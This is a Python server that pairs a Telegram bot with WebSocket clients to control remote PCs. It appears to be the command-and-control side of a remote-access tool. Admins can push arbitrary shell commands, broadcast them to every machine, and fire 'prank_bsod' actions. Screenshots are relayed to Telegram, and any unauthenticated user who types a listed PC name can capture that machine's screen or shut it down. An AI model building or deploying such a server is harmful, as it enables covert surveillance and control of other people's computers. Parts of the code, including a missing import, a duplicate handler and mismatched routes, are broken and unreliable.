"""
Central Server
==============
- Admin users: full command access via /send, /scripts, /intercept, etc.
- Normal users: type PC name → get 3 buttons: Screenshot / Lock / Shutdown
- Admin panel at /admin (web UI)
Deploy on Railway / Render.
"""

import asyncio, json, os, logging
from datetime import datetime
from typing import Optional

import aiohttp
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("server")

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG  (set as environment variables on Railway)
# ─────────────────────────────────────────────────────────────────────────────
BOT_TOKEN  = os.environ["BOT_TOKEN"]
ADMIN_IDS  = set(map(int, os.environ.get("ADMIN_IDS", "").split(",")))
SECRET_KEY = os.environ.get("SECRET_KEY", "changeme")
PUBLIC_URL = os.environ.get("PUBLIC_URL", "http://localhost:8080")
PORT       = int(os.environ.get("PORT", 8080))

# ─────────────────────────────────────────────────────────────────────────────
# STATE
# ─────────────────────────────────────────────────────────────────────────────
clients:   dict[str, dict] = {}   # name → {ws, last_seen}
history:   list[dict]      = []
intercepts: dict[str, str] = {}

# Normal users waiting to pick a PC (user_id → None = awaiting name input)
# user_id → script_name (once they've unlocked a PC)
user_sessions: dict[int, Optional[str]] = {}


def now_str():
    return datetime.utcnow().strftime("%H:%M:%S")

def add_history(src, script, cmd, result="pending"):
    history.append({"time": now_str(), "from": src, "script": script,
                    "command": cmd, "result": result})
    if len(history) > 300: history.pop(0)


# ─────────────────────────────────────────────────────────────────────────────
# WEBSOCKET — client connections
# ─────────────────────────────────────────────────────────────────────────────
async def ws_handler(request: web.Request):
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)
    name: Optional[str] = None

    async for msg in ws:
        if msg.type == aiohttp.WSMsgType.TEXT:
            try: data = json.loads(msg.data)
            except: continue

            kind = data.get("type")

            if kind == "register":
                if data.get("secret") != SECRET_KEY:
                    await ws.send_json({"type": "error", "msg": "bad secret"})
                    await ws.close(); return ws
                name = data["name"]
                clients[name] = {"ws": ws, "last_seen": now_str()}
                log.info(f"[+] {name} connected")
                await ws.send_json({"type": "ok", "msg": f"Registered as {name}"})

            elif kind == "result":
                cmd    = data.get("command", "")
                result = data.get("result", "")
                add_history("client", name, cmd, result)
                log.info(f"[result] {name}: {cmd!r} → {result[:80]!r}")
                if "reply_chat_id" in data:
                    chat_id = data["reply_chat_id"]
                    # Screenshot base64 — send as photo directly to Telegram
                    if result.startswith("[SCREENSHOT_B64]"):
                        try:
                            import base64, io as _sio
                            lines  = result.split("\n", 2)
                            dims   = lines[0].replace("[SCREENSHOT_B64]", "").strip()
                            b64    = lines[2] if len(lines) > 2 else lines[1]
                            raw    = base64.b64decode(b64)
                            buf    = _sio.BytesIO(raw)
                            buf.name = "screenshot.png"
                            await _app.bot.send_photo(
                                chat_id=chat_id,
                                photo=buf,
                                caption=f"📸 *{name}* — {dims}",
                                parse_mode="Markdown",
                            )
                        except Exception as e:
                            await send_tg(chat_id, f"📸 Screenshot taken but failed to send as photo: {e}")
                    else:
                        await send_tg(chat_id,
                                      f"✅ *{name}* › `{cmd}`\n```\n{result[:3000]}\n```")

            elif kind == "ping":
                if name: clients[name]["last_seen"] = now_str()
                await ws.send_json({"type": "pong"})

        elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
            break

    if name and name in clients:
        del clients[name]
        log.info(f"[-] {name} disconnected")
    return ws


async def send_command(script_name: str, command: str, reply_chat_id: int = None):
    if script_name not in clients:
        return False, "Script not connected."
    ws = clients[script_name]["ws"]
    payload = {"type": "command", "command": command}
    if reply_chat_id: payload["reply_chat_id"] = reply_chat_id
    await ws.send_json(payload)
    add_history("server", script_name, command)
    return True, "sent"


# ─────────────────────────────────────────────────────────────────────────────
# TELEGRAM HELPERS
# ─────────────────────────────────────────────────────────────────────────────
_app: Application = None

async def send_tg(chat_id: int, text: str, reply_markup=None):
    if _app:
        try:
            await _app.bot.send_message(chat_id=chat_id, text=text,
                                        parse_mode="Markdown",
                                        reply_markup=reply_markup)
        except Exception as e:
            log.warning(f"send_tg error: {e}")

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


# ─────────────────────────────────────────────────────────────────────────────
# NORMAL USER FLOW
# Three big buttons: Screenshot / Lock / Shutdown
# ─────────────────────────────────────────────────────────────────────────────

def user_buttons(script_name: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📸  Screenshot", callback_data=f"u:screenshot:{script_name}")],
        [InlineKeyboardButton("🔒  Lock Screen", callback_data=f"u:lock:{script_name}")],
        [InlineKeyboardButton("🔴  Shut Down",   callback_data=f"u:shutdown:{script_name}")],
    ])

async def handle_user_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Non-admin users: ask them to type their PC name."""
    uid = update.effective_user.id
    user_sessions[uid] = None   # mark as "waiting for PC name"
    await update.message.reply_text(
        "👋 Welcome!\n\n"
        "Type the *name of your PC* to connect to it.\n"
        "_(e.g.  brothers\\_pc  or  office\\_pc)_",
        parse_mode="Markdown"
    )

async def handle_user_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle normal user typing a PC name."""
    uid  = update.effective_user.id
    text = update.message.text.strip()

    if uid not in user_sessions or user_sessions[uid] is not None:
        # Not in setup flow — ignore
        return

    # Check if the typed name matches a connected script
    if text in clients:
        user_sessions[uid] = text
        await update.message.reply_text(
            f"✅ Connected to *{text}*!\n\nChoose what you want to do:",
            parse_mode="Markdown",
            reply_markup=user_buttons(text)
        )
    else:
        # List connected PCs to help
        connected = list(clients.keys())
        hint = ""
        if connected:
            hint = "\n\nConnected PCs right now:\n" + "\n".join(f"• `{c}`" for c in connected)
        await update.message.reply_text(
            f"❌ No PC named *{text}* is online right now.{hint}\n\nTry again:",
            parse_mode="Markdown"
        )

async def handle_user_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle button presses from normal users."""
    query = update.callback_query
    await query.answer()
    uid  = query.from_user.id
    data = query.data

    if not data.startswith("u:"):
        return

    _, action, script_name = data.split(":", 2)

    if script_name not in clients:
        await query.edit_message_text(
            f"❌ *{script_name}* is no longer connected.\nSend /start to try again.",
            parse_mode="Markdown"
        )
        user_sessions.pop(uid, None)
        return

    command_map = {
        "screenshot": "screenshot",
        "lock":       "lock",
        "shutdown":   "shutdown 30",
    }
    labels = {
        "screenshot": "📸 Taking screenshot...",
        "lock":       "🔒 Locking screen...",
        "shutdown":   "🔴 Shutting down in 30s... (use cancel to abort)",
    }

    command = command_map.get(action)
    if not command: return

    await query.edit_message_text(
        f"{labels[action]}\n\n_(You'll get the result here)_",
        parse_mode="Markdown"
    )
    await send_command(script_name, command, query.message.chat_id)

    # Restore buttons after a moment
    await asyncio.sleep(3)
    try:
        await _app.bot.send_message(
            chat_id=query.message.chat_id,
            text=f"Connected to *{script_name}* — choose another action:",
            parse_mode="Markdown",
            reply_markup=user_buttons(script_name)
        )
    except: pass


# ─────────────────────────────────────────────────────────────────────────────
# ADMIN COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if is_admin(uid):
        await update.message.reply_text(
            "RC *Admin Control Centre*\n\n"
            "/scripts — list connected PCs\n"
            "/send script1 command — send command\n"
            "/intercept script1 command — override next command\n"
            "/history — last commands\n"
            "/broadcast command — send to ALL scripts\n"
            "/panel — open web admin panel",
            parse_mode="Markdown"
        )
    else:
        await handle_user_start(update, ctx)

async def cmd_scripts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not clients:
        await update.message.reply_text("No scripts connected."); return
    lines = ["📡 *Connected scripts:*"]
    for name, info in clients.items():
        inter = f"\n    * intercept: `{intercepts[name]}`" if name in intercepts else ""
        lines.append(f"• `{name}` — last seen {info['last_seen']}{inter}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def cmd_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    args = ctx.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/send <script> <command>`", parse_mode="Markdown"); return
    script_name = args[0]
    command     = " ".join(args[1:])
    if script_name in intercepts:
        command = intercepts.pop(script_name)
        await update.message.reply_text(f"ℹ️ Intercept active → sending `{command}`", parse_mode="Markdown")
    ok, msg = await send_command(script_name, command, update.effective_chat.id)
    status  = f"📤 Sent `{command}` → `{script_name}`" if ok else f"❌ {msg}"
    await update.message.reply_text(status, parse_mode="Markdown")

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/broadcast <command>`", parse_mode="Markdown"); return
    command = " ".join(ctx.args)
    if not clients:
        await update.message.reply_text("No scripts connected."); return
    sent = []
    for name in clients:
        ok, _ = await send_command(name, command, update.effective_chat.id)
        if ok: sent.append(name)
    await update.message.reply_text(
        f"📡 Broadcast `{command}` → {len(sent)} scripts: {', '.join(f'`{s}`' for s in sent)}",
        parse_mode="Markdown"
    )

async def cmd_intercept(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    args = ctx.args
    if len(args) < 2:
        await update.message.reply_text("Usage: `/intercept <script> <command>`", parse_mode="Markdown"); return
    script_name, command = args[0], " ".join(args[1:])
    intercepts[script_name] = command
    await update.message.reply_text(
        f"* Next command for `{script_name}` → `{command}`", parse_mode="Markdown"
    )

async def cmd_history(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not history:
        await update.message.reply_text("No history."); return
    lines = ["📜 *Last 15 commands:*"]
    for h in history[-15:][::-1]:
        lines.append(f"`{h['time']}` [{h['from']}→{h['script']}] `{h['command']}` → {h['result'][:60]}")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


# ─────────────────────────────────────────────────────────────────────────────
# /help — BOTFATHER-STYLE COMMAND LIST
# ─────────────────────────────────────────────────────────────────────────────

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show available commands (BotFather style)."""
    user_id = update.effective_user.id
    is_admin = str(user_id) in ADMIN_IDS
    
    if is_admin:
        help_text = """🤖 **Admin Commands** (BotFather Help)

/start — Show main menu
/scripts — List connected scripts
/send script1 status — Send command to script
/broadcast lock — Send to ALL scripts at once
/intercept script1 lock — Override next command
/history — Show last 15 commands
/panel — Open web admin panel
/help — Show this help

💡 **Syntax:**
• Command chaining: `/send mypc screenshot /and lock`
• Pranks: `/send mypc prank_update` or `prank_bsod`
• Multi-script: `/broadcast status` (all PCs report)

📚 **All Commands:** Check `/panel` for full guide (82 total)
"""
    else:
        help_text = """🤖 **Available Commands**

Type your PC name to get a quick control menu:
1. 📸 Screenshot
2. 🔒 Lock Screen
3. 🔴 Shutdown

Example: `brothers_pc` → get buttons above

Admin commands unavailable. Ask admin for access.
"""
    
    await update.message.reply_text(help_text, parse_mode="Markdown")


async def cmd_panel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    await update.message.reply_text(f"🌐 Admin panel:\n{PUBLIC_URL}/admin")


# ─────────────────────────────────────────────────────────────────────────────
# ADMIN WEB PANEL
# ─────────────────────────────────────────────────────────────────────────────
def chk(r: web.Request) -> bool:
    return r.headers.get("X-Admin-Key") == SECRET_KEY

async def h_panel(r):
    """Serve the admin panel HTML"""
    try:
        # Try to read from file
        panel_file = Path(__file__).parent / "admin_panel.html"
        if panel_file.exists():
            content = panel_file.read_text(encoding='utf-8')
            return web.Response(text=content, content_type="text/html")
    except:
        pass
    # Fallback: serve embedded minimal panel
    return web.Response(text="""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Remote Control Admin</title>
        <style>
            body { background: #0d1117; color: #c9d1d9; font-family: -apple-system, sans-serif; padding: 40px; }
            .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin: 20px 0; max-width: 600px; }
            input { background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 10px; border-radius: 4px; width: 100%; margin: 10px 0; font-size: 1rem; }
            button { background: #58a6ff; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: 600; }
            button:hover { background: #65b1ff; }
            .modal { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; }
            .modal-content { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 40px; max-width: 400px; text-align: center; }
        </style>
    </head>
    <body>
        <div class="modal">
            <div class="modal-content">
                <h1>Admin Panel Loading...</h1>
                <p>The full panel HTML file is being loaded.</p>
                <p style="color: #8b949e; margin-top: 20px; font-size: 0.9rem;">If you see this, please refresh the page. Full panel should load automatically.</p>
                <button onclick="location.reload()">Refresh</button>
            </div>
        </div>
        <script>
            setTimeout(() => location.reload(), 3000);
        </script>
    </body>
    </html>
    """, content_type="text/html")



async def h_panel(r):
    """Serve admin panel"""
    html = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Remote Control Admin</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,sans-serif;padding:20px}h1{margin-bottom:20px}.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:20px}input,textarea{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px;border-radius:4px;width:100%;margin-bottom:10px;font-family:monospace;font-size:0.9rem}button{background:#58a6ff;color:#fff;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-weight:600;margin-top:10px}button:hover{background:#65b1ff}#scripts{list-style:none}#scripts li{padding:10px;background:#0d1117;margin-bottom:5px;border-radius:4px;cursor:pointer}#scripts li:hover{background:#1c2128}#scripts li.active{background:#58a6ff20;border-left:3px solid #58a6ff}#history{background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:10px;max-height:300px;overflow-y:auto;font-family:monospace;font-size:0.85rem}.hist-item{padding:5px;border-bottom:1px solid #30363d}.hist-item:last-child{border:0}</style></head><body><h1>Remote Control Admin Panel</h1><div class="card"><h2>Scripts</h2><ul id="scripts"></ul></div><div class="card"><h2>Send Command</h2><select id="script-select"><option value="">Select a script</option></select><br><input type="text" id="cmd-input" placeholder="Command (e.g. screenshot /and lock)" onkeypress="if(event.key=='Enter')sendCmd()"><button onclick="sendCmd()">Send</button><button onclick="sendBroadcast()" style="background:#f85149">Broadcast All</button></div><div class="card"><h2>History</h2><div id="history"><div style="color:#8b949e">No commands yet</div></div></div><script>let selectedScript=null;async function loadScripts(){const r=await fetch('/api/scripts',{headers:{'X-Admin-Key':prompt('Admin Key:')||''}});const d=await r.json();if(!d.scripts)return;const select=document.getElementById('script-select');const list=document.getElementById('scripts');list.innerHTML='';select.innerHTML='<option value="">Select a script</option>';d.scripts.forEach(s=>{const li=document.createElement('li');li.textContent=s.name+(s.connected?' [ONLINE]':' [OFFLINE]');li.onclick=()=>{selectedScript=s.name;document.querySelectorAll('#scripts li').forEach(e=>e.classList.remove('active'));li.classList.add('active');select.value=s.name};list.appendChild(li);const opt=document.createElement('option');opt.value=s.name;opt.textContent=s.name;select.appendChild(opt)});if(d.history)(d.history||[]).slice(-20).reverse().forEach(h=>{const item=document.createElement('div');item.className='hist-item';item.textContent=`[${h.time}] ${h.script}: ${h.command} -> ${h.result.substring(0,50)}...`;document.getElementById('history').appendChild(item)})}async function sendCmd(){const cmd=document.getElementById('cmd-input').value;const script=selectedScript||document.getElementById('script-select').value;if(!cmd||!script){alert('Select script and enter command');return}await fetch('/api/send',{method:'POST',headers:{'X-Admin-Key':prompt('Key:')||'','Content-Type':'application/json'},body:JSON.stringify({script:script,command:cmd})});document.getElementById('cmd-input').value='';loadScripts()}async function sendBroadcast(){const cmd=document.getElementById('cmd-input').value;if(!cmd){alert('Enter command');return}await fetch('/api/broadcast',{method:'POST',headers:{'X-Admin-Key':prompt('Key:')||'','Content-Type':'application/json'},body:JSON.stringify({command:cmd})});loadScripts()}loadScripts();setInterval(loadScripts,3000)</script></body></html>"""
    return web.Response(text=html, content_type="text/html")


async def h_status(r):
    if not chk(r): return web.Response(status=403, text="Forbidden")
    scripts = [{"name": n, "last_seen": i["last_seen"], "intercept": intercepts.get(n)}
               for n, i in clients.items()]
    return web.json_response({"scripts": scripts, "history": history})

async def h_send(r):
    if not chk(r): return web.Response(status=403, text="Forbidden")
    data = await r.json()
    script, command = data.get("script"), data.get("command")
    if script in intercepts: command = intercepts.pop(script)
    ok, msg = await send_command(script, command)
    return web.json_response({"ok": ok, "msg": msg})

async def h_intercept(r):
    if not chk(r): return web.Response(status=403, text="Forbidden")
    data = await r.json()
    intercepts[data["script"]] = data["command"]
    return web.json_response({"ok": True})

async def h_broadcast(r):
    if not chk(r): return web.Response(status=403, text="Forbidden")
    data    = await r.json()
    command = data.get("command", "")
    sent = []
    for name in list(clients.keys()):
        ok, _ = await send_command(name, command)
        if ok: sent.append(name)
    return web.json_response({"ok": True, "sent": sent})


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
async def main():
    global _app

    _app = Application.builder().token(BOT_TOKEN).build()

    # Admin commands
    _app.add_handler(CommandHandler("start",     cmd_start))
    _app.add_handler(CommandHandler("scripts",   cmd_scripts))
    _app.add_handler(CommandHandler("send",      cmd_send))
    _app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    _app.add_handler(CommandHandler("intercept", cmd_intercept))
    _app.add_handler(CommandHandler("history",   cmd_history))
    _app.add_handler(CommandHandler("panel",     cmd_panel))

    # Normal user: button callbacks
    _app.add_handler(CallbackQueryHandler(handle_user_callback, pattern=r"^u:"))

    # Normal user: text messages (PC name input)
    _app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_message))

    await _app.initialize()
    await _app.start()

    # Telegram polling loop
    async def poll():
        offset = None
        while True:
            try:
                updates = await _app.bot.get_updates(offset=offset, timeout=10,
                                                     allowed_updates=["message","callback_query"])
                for u in updates:
                    offset = u.update_id + 1
                    await _app.process_update(Update.de_json(u.to_dict(), _app.bot))
            except Exception as e:
                log.warning(f"Poll error: {e}")
            await asyncio.sleep(1)

    asyncio.create_task(poll())

    # Web server
    web_app = web.Application()
    web_app.router.add_get("/ws",            ws_handler)
    web_app.router.add_get("/admin",         h_panel)
    web_app.router.add_get("/api/status",    h_status)
    web_app.router.add_post("/api/send",     h_send)
    web_app.router.add_post("/api/intercept",h_intercept)
    web_app.router.add_post("/api/broadcast",h_broadcast)

    runner = web.AppRunner(web_app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()
    log.info(f"Server on port {PORT}. Admin panel: {PUBLIC_URL}/admin")
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
